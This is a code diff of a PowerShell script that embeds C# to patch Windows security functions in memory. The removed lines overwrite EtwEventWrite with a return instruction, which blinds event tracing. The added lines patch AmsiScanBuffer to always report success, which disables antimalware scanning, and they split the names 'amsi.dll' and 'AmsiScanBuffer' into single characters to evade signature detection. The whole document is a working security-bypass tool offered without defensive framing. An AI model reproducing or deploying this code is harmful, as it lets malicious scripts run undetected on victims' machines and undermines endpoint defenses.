@@ -17,24 +17,19 @@ public class Patcher
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
 
-    public static void PatchEtwEventWrite()
+    public static bool PatchAmsi()
     {
-        const uint PAGE_EXECUTE_READWRITE = 0x40;
-        string ntdllModuleName = "ntdll.dll";
-        string etwEventWriteFunctionName = "EtwEventWrite";
-
-        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
-        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
-
-        byte[] retOpcode = { 0xC3 };
-
-        uint oldProtect;
-        VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
-        
-        int bytesWritten;
-        WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
+        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
     }
 }
 "@
 Add-Type -TypeDefinition $amsixetwpatch -Language CSharp
-[Patcher]::PatchEtwEventWrite()
+[Patcher]::PatchAmsi()
